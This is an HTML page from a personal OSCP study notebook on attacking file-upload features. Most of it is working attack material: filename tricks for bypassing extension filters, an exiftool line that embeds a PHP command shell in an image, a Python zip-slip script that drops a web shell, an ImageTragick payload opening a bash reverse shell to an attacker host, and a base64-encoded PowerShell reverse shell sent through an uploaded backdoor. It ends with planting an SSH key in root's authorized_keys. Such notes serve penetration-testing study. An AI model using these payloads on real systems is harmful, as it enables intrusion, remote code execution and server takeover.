@@ -1,0 +1,507 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>File Uploads - Brandon&#x27;s OSCP Notes</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> The Things</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Quick Notes.html"><strong aria-hidden="true">1.1.</strong> Quick Notes</a></li><li class="chapter-item expanded "><a href="Scanning.html"><strong aria-hidden="true">1.2.</strong> Scanning</a></li><li class="chapter-item expanded "><a href="File Transfer.html"><strong aria-hidden="true">1.3.</strong> File Transfer</a></li><li class="chapter-item expanded "><a href="Ports.html"><strong aria-hidden="true">1.4.</strong> Ports</a></li><li class="chapter-item expanded "><a href="Shells.html"><strong aria-hidden="true">1.5.</strong> Shells</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Gaining Access</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="CrackMapExecCheatSheet.html"><strong aria-hidden="true">2.1.</strong> CrackMapExec Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Web Shells.html"><strong aria-hidden="true">2.2.</strong> Web Shells</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.3.</strong> Password Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="My Hashcat Cheatsheet.html"><strong aria-hidden="true">2.3.1.</strong> Hashcat Cheat Sheet</a></li><li class="chapter-item expanded "><a href="My Hydra Cheatsheet.html"><strong aria-hidden="true">2.3.2.</strong> Hydra Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Bruteforce.html"><strong aria-hidden="true">2.3.3.</strong> Bruteforce</a></li></ol></li><li class="chapter-item expanded "><a href="Buffer Overflow.html"><strong aria-hidden="true">2.4.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="File Uploads.html" class="active"><strong aria-hidden="true">2.5.</strong> File Uploads</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="htmlfileupload.html"><strong aria-hidden="true">2.5.1.</strong> HTML</a></li><li class="chapter-item expanded "><a href="MyMacros.html"><strong aria-hidden="true">2.5.2.</strong> Macro</a></li><li class="chapter-item expanded "><a href="OLEFileUpload.html"><strong aria-hidden="true">2.5.3.</strong> OLE</a></li></ol></li><li class="chapter-item expanded "><a href="LFIRFI.html"><strong aria-hidden="true">2.6.</strong> LFI/RFI</a></li><li class="chapter-item expanded "><a href="ShellShock.html"><strong aria-hidden="true">2.7.</strong> Shell Shock</a></li><li class="chapter-item expanded "><a href="Github.html"><strong aria-hidden="true">2.8.</strong> Github</a></li><li class="chapter-item expanded "><a href="MySQL.html"><strong aria-hidden="true">2.9.</strong> SQL</a></li><li class="chapter-item expanded "><a href="WindowLibraries.html"><strong aria-hidden="true">2.10.</strong> Windows Libraries and APIs</a></li><li class="chapter-item expanded "><a href="XXEXSSDeSerial.html"><strong aria-hidden="true">2.11.</strong> XXE_XSS_Deserialization</a></li><li class="chapter-item expanded "><a href="DirectoryTraveral.html"><strong aria-hidden="true">2.12.</strong> Directory Traversal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Linux PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LinuxEnum.html"><strong aria-hidden="true">3.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="LinuxPrivExploit.html"><strong aria-hidden="true">3.2.</strong> Exploit</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Windows PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WinPrivEnum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="WinPrivExploit.html"><strong aria-hidden="true">4.2.</strong> Exploit</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Active Directory</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WeGotUsersbutnoPass.html"><strong aria-hidden="true">5.1.</strong> We got Users but no Pass?</a></li><li class="chapter-item expanded "><a href="ADEnum.html"><strong aria-hidden="true">5.2.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="ADAuth.html"><strong aria-hidden="true">5.3.</strong> Authentication</a></li><li class="chapter-item expanded "><a href="ADPivoting.html"><strong aria-hidden="true">5.4.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="ADLateralMovement.html"><strong aria-hidden="true">5.5.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="ADHashDump.html"><strong aria-hidden="true">5.6.</strong> Hash Dumping</a></li><li class="chapter-item expanded "><a href="ADPersistence.html"><strong aria-hidden="true">5.7.</strong> Persistence</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Brandon&#x27;s OSCP Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <p>Only refer Extensions section below for OSCP File upload Bypassing</p>
+<ul>
+<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html">Total OSCP Guide File Uploads</a></li>
+</ul>
+<h2 id="extensions"><a class="header" href="#extensions">EXTENSIONS</a></h2>
+<ul>
+<li><strong>PHP</strong>: <em>.php</em>, <em>.php2</em>, <em>.php3</em>, .<em>php4</em>, .<em>php5</em>, .<em>php6</em>, .<em>php7</em>, .phps, .<em>phps</em>, .<em>pht</em>, .<em>phtm, .phtml</em>, .<em>pgif</em>, <em>.shtml, .htaccess, .phar, .inc</em></li>
+<li><strong>ASP</strong>: <em>.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml</em></li>
+<li><strong>Jsp:</strong> <em>.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action</em></li>
+<li><strong>Coldfusion:</strong> <em>.cfm, .cfml, .cfc, .dbm</em></li>
+<li><strong>Flash</strong>: <em>.swf</em></li>
+<li><strong>Perl</strong>: <em>.pl, .cgi</em></li>
+<li><strong>Erlang Yaws Web Server</strong>: <em>.yaws</em></li>
+</ul>
+<h2 id="bypass-file-extensions-checks"><a class="header" href="#bypass-file-extensions-checks">Bypass file extensions checks</a></h2>
+<ol>
+<li>
+<p>If they apply, then check the previous extensions. Also test them using some uppercase letters: PHP, .pHP5, .PhAr ...</p>
+</li>
+<li>
+<p>Try adding a valid extension before the execution extension (use previous extensions also):</p>
+<ul>
+<li>file.png.php</li>
+<li>file.png.Php5</li>
+</ul>
+</li>
+<li>
+<p>Try adding special characters at the end. You could use Burp to brute-force all the ASCII and Unicode characters. (Note that you can also try to use the previously motioned extensions)</p>
+<ul>
+<li>file.php%20</li>
+<li>file.php%0a</li>
+<li>file.php%00</li>
+<li>file.php%0d%0a</li>
+<li>file.php/</li>
+<li>file.php.\</li>
+<li>file.</li>
+<li>file.php....</li>
+<li>file.pHp5....</li>
+</ul>
+</li>
+<li>
+<p>Try to bypass the protections by tricking the extension parser on the server-side with techniques like doubling the extension or adding junk data (null bytes) between extensions. You can also use the previous extensions to prepare a better payload.</p>
+<ul>
+<li>file.png.php</li>
+<li>file.png.pHp5</li>
+<li>file.php%00.png</li>
+<li>file.php\x00.png</li>
+<li>file.php%0a.png</li>
+<li>file.php%0d%0a.png</li>
+<li>file.phpJunk123png</li>
+</ul>
+</li>
+<li>
+<p>Add another layer of extensions to the previous check:</p>
+<ul>
+<li>file.png.jpg.php</li>
+<li>file.php%00.png%00.jpg</li>
+</ul>
+</li>
+<li>
+<p>Try to put the exec extension before the valid extension and pray so the server is misconfigured. <strong>(useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php</strong> will execute code):</p>
+<ul>
+<li>ex: file.php.png</li>
+</ul>
+</li>
+<li>
+<p>Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “::$data” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”)</p>
+</li>
+</ol>
+<h2 id="bypass-content-type--magic-number"><a class="header" href="#bypass-content-type--magic-number">Bypass Content-Type &amp; magic number</a></h2>
+<ol>
+<li>
+<p>Bypass Content-Type checks by setting the value of the Content-Type header to image/png, text/plain, application/octet-stream</p>
+</li>
+<li>
+<p>Bypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). Or introduce the shell inside the metadata:</p>
+</li>
+</ol>
+<pre><code> exiftool -Comment="&lt;?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpgv
+</code></pre>
+<ul>
+<li>It is also possible that the <strong>magic bytes</strong> are just being <strong>checked</strong> in the file and you could set them <strong>anywhere in the file</strong>.</li>
+</ul>
+<h2 id="other-tricks-to-check"><a class="header" href="#other-tricks-to-check">Other Tricks to check</a></h2>
+<ul>
+<li>
+<p>Find a vulnerability to rename the file already uploaded (to change the extension).</p>
+</li>
+<li>
+<p>Find a Local File Inclusion vulnerability to execute the backdoor.</p>
+</li>
+<li>
+<p>Possible Information disclosure:</p>
+<ul>
+<li>Upload several times (and at the same time) the same file with the same name</li>
+<li>Upload a file with the name of a file or folder that already exists</li>
+<li>Uploading a file with “.”, “..”, or “…” as its name. For instance, in Apache in Windows, if the application saves the uploaded files in the “/www/uploads/” directory, the “.” filename will create a file called “uploads” in the “/www/” directory.</li>
+<li>Upload a file that may not be deleted easily such as “…:.jpg” in NTFS. (Windows)</li>
+<li>Upload a file in Windows with invalid characters such as |&lt;&gt;*?” in its name. (Windows)</li>
+<li>Upload a file in Windows using reserved (forbidden) names such as CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.</li>
+</ul>
+</li>
+<li>
+<p>Try also to upload an executable (.exe) or a .html (less suspicious) that will execute code when accidentally opened by the victim.</p>
+</li>
+</ul>
+<h2 id="wget-file-uploadssrf-trick"><a class="header" href="#wget-file-uploadssrf-trick">wget File Upload/SSRF Trick</a></h2>
+<p>On some occasions, you may find that a server is using <strong><code>wget</code></strong> to <strong>download files</strong> and you can <strong>indicate</strong> the <strong>URL</strong>. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, <strong>this check can be bypassed.</strong> The <strong>maximum</strong> length of a <strong>filename</strong> in L<strong>inux</strong> is <strong>255</strong>, however, <strong>wget</strong> truncate the filenames to <strong>236</strong> characters. You can <strong>download a file called "A"*232+".php"+".gif"</strong>, this filename will <strong>bypass</strong> the <strong>check</strong> (as in this example <strong>".gif"</strong> is a <strong>valid</strong> extension) but <code>wget</code> will <strong>rename</strong> the file to <strong>"A"*232+".php"</strong>.</p>
+<pre><code>#Create file and HTTP server
+echo "SOMETHING" &gt; $(python -c 'print("A"*(236-4)+".php"+".gif")')
+python3 -m http.server 9080
+</code></pre>
+<pre><code>#Download the file
+wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
+The name is too long, 240 chars total.
+Trying to shorten...
+The new name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
+--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
+Connecting to 127.0.0.1:9080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 10 [image/gif]
+Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================&gt;]      10  --.-KB/s    in 0s      
+
+2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
+</code></pre>
+<p>Note that <strong>another option</strong> you may be thinking of to bypass this check is to make the <strong>HTTP server redirect to a different file</strong>, so the initial URL will bypass the check by then Wget will download the redirected file with the new name. This <strong>won't work</strong> <strong>unless</strong> the wget is being used with the <strong>parameter</strong> <code>--trust-server-names</code> because the <strong>wget will download the redirected page with the name of the file indicated in the original URL</strong>.</p>
+<h2 id="from-file-upload-to-other-vulnerabilities"><a class="header" href="#from-file-upload-to-other-vulnerabilities">From File upload to other vulnerabilities</a></h2>
+<ul>
+<li>Set <strong>filename</strong> to <code>../../../tmp/lol.png</code> and try to achieve a <strong>path traversal</strong></li>
+<li>Set <strong>filename</strong> to <code>sleep(10)-- -.jpg</code> and you may be able to achieve a <strong>SQL injection</strong></li>
+<li>Set <strong>filename</strong> to <code>&lt;svg onload=alert(document.comain)&gt;</code> to achieve an XSS</li>
+<li>Set <strong>filename</strong> to <code>; sleep 10;</code> to test some command injection</li>
+</ul>
+<p>Here’s a top 10 list of things that you can achieve by uploading (from the <a href="https://twitter.com/SalahHasoneh1/status/1281274120395685889">link</a>)</p>
+<ol>
+<li><strong>ASP / ASPX / PHP5 / PHP / PHP3</strong>: Webshell / RCE</li>
+<li><strong>SVG</strong>: Stored XSS / SSRF / XXE</li>
+<li><strong>GIF</strong>: Stored XSS / SSRF</li>
+<li><strong>CSV</strong>: CSV injection</li>
+<li><strong>XML</strong>: XXE</li>
+<li><strong>AVI</strong>: LFI / SSRF</li>
+<li><strong>HTML / JS</strong> : HTML injection / XSS / Open redirect</li>
+<li><strong>PNG / JPEG</strong>: Pixel flood attack (DoS)</li>
+<li><strong>ZIP</strong>: RCE via LFI / DoS</li>
+<li><strong>PDF / PPTX</strong>: SSRF / BLIND XXE</li>
+</ol>
+<h2 id="magic-header-bytes"><a class="header" href="#magic-header-bytes">Magic Header Bytes</a></h2>
+<ul>
+<li><strong>PNG</strong>: <code>"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["</code></li>
+<li><strong>JPG</strong>: <code>"\xff\xd8\xff"</code></li>
+</ul>
+<h2 id="zip-file-automatically-decompressed-upload"><a class="header" href="#zip-file-automatically-decompressed-upload">Zip File Automatically decompressed Upload</a></h2>
+<p>If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:</p>
+<h3 id="symlink"><a class="header" href="#symlink">Symlink</a></h3>
+<p>Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:</p>
+<pre><code>ln -s ../../../index.php symindex.txt
+zip --symlinks test.zip symindex.txt
+</code></pre>
+<h3 id="decompress-in-different-folders"><a class="header" href="#decompress-in-different-folders">Decompress in different folders</a></h3>
+<p>The decompressed files will be created in unexpected folders.</p>
+<p>One could easily assume that this setup protects from OS-level command execution via malicious file uploads but unfortunately, this is not true. Since the ZIP archive format supports hierarchical compression and we can also reference higher-level directories we can escape from the safe upload directory by abusing the decompression feature of the target application.</p>
+<p>An automated exploit to create this kind of files can be found here: <a href="https://github.com/ptoomey3/evilarc">https://github.com/ptoomey3/evilarc</a></p>
+<pre><code>python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
+</code></pre>
+<p>Some python code to create a malicious zip:</p>
+<pre><code>#!/usr/bin/python
+import zipfile
+from cStringIO import StringIO 
+
+def create_zip():
+    f = StringIO()
+    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+    z.writestr('../../../../../var/www/html/webserver/shell.php', '&lt;?php echo system($_REQUEST["cmd"]); ?&gt;')
+    z.writestr('otherfile.xml', 'Content of the file')
+    z.close()
+    zip = open('poc.zip','wb')
+    zip.write(f.getvalue())
+    zip.close() 
+
+create_zip()
+</code></pre>
+<p>To achieve remote command execution I took the following steps:</p>
+<ol>
+<li>Create a PHP shell:</li>
+</ol>
+<pre><code>&lt;?php 
+if(isset($_REQUEST['cmd'])){
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+}?&gt;
+</code></pre>
+<ol start="2">
+<li>Use “file spraying” and create a compressed zip file:</li>
+</ol>
+<pre><code>root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
+root@s2crew:/tmp# ls *.php
+simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
+xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
+xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
+root@s2crew:/tmp# zip cmd.zip xx*.php
+  adding: xxAcmd.php (deflated 40%)
+  adding: xxAxxAcmd.php (deflated 40%)
+  adding: xxAxxAxxAcmd.php (deflated 40%)
+  adding: xxAxxAxxAxxAcmd.php (deflated 40%)
+  adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
+  adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
+  adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
+  adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
+  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
+  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
+root@s2crew:/tmp#
+</code></pre>
+<ol start="3">
+<li>Use a hex-editor or vi and change the “xxA” to “../”, I used vi:</li>
+</ol>
+<pre><code>:set modifiable
+:%s/xxA/..\//g
+:x!
+</code></pre>
+<p>Done!
+Only one step remained: Upload the ZIP file and let the application decompress it! If it succeeds and the web server has sufficient privileges to write the directories there will be a simple OS command execution shell on the system:</p>
+<pre><code>url/cmd.php?cmd=id
+</code></pre>
+<h2 id="imagetragic"><a class="header" href="#imagetragic">ImageTragic</a></h2>
+<p>Upload this content with an image extension to exploit the vulnerability <strong>(ImageMagick, 7.0.1-1)</strong></p>
+<pre><code>push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/test.jpg"|bash -i &gt;&amp; /dev/tcp/attacker-ip/attacker-port 0&gt;&amp;1|touch "hello)'
+pop graphic-context
+</code></pre>
+<h2 id="embedding-php-shell-on-png"><a class="header" href="#embedding-php-shell-on-png">Embedding PHP Shell on PNG</a></h2>
+<p>The primary reason for putting a web shell in the IDAT chunk is that it has the ability to bypass resize and re-sampling operations - PHP-GD contains two functions to do this <a href="http://php.net/manual/en/function.imagecopyresized.php">imagecopyresized</a> and <a href="http://php.net/manual/en/function.imagecopyresampled.php">imagecopyresampled</a>.</p>
+<p>Read this post: <a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p>
+<h2 id="polyglot-files"><a class="header" href="#polyglot-files">Polyglot Files</a></h2>
+<p>Polyglots, in a security context, are files that are a valid form of multiple different file types. For example, a <a href="https://en.wikipedia.org/wiki/Gifar">GIFAR</a> is both a GIF and a RAR file. There are also files out there that can be both GIF and JS, both PPT and JS, etc.</p>
+<p>Polyglot files are often used to bypass protection based on file types. Many applications that allow users to upload files only allow uploads of certain types, such as JPEG, GIF, DOC, so as to prevent users from uploading potentially dangerous files like JS files, PHP files or Phar files.</p>
+<p>This helps to upload a file that complies with the format of several different formats. It can allow you to upload a PHAR file (PHP ARchive) that also looks like a JPEG, but probably you will still need a valid extension and if the upload function doesn't allow it this won't help you.</p>
+<p>More information in: <a href="https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a">https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a</a></p>
+<h2 id="php-powershell-upload-example"><a class="header" href="#php-powershell-upload-example">PHP PowerShell Upload Example</a></h2>
+<pre><code>Upload the backdoor, then:
+
+curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
+
+pwsh
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0...
+
+
+
+Let’s try to overwrite the authorized_keys file in the home directory for root
+ssh-keygen
+fileup
+cat fileup.pub &gt; authorized_keys
+Now that the authorized_keys file contains our public key, we can upload it using the relative path ../../../../../../../root/.ssh/authorized_keys *Burp or Curl Put*
+rm ~/.ssh/known_hosts
+ssh -p 2222 -i fileup root@mountaindesserts.com
+
+
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="Buffer Overflow.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="htmlfileupload.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="Buffer Overflow.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
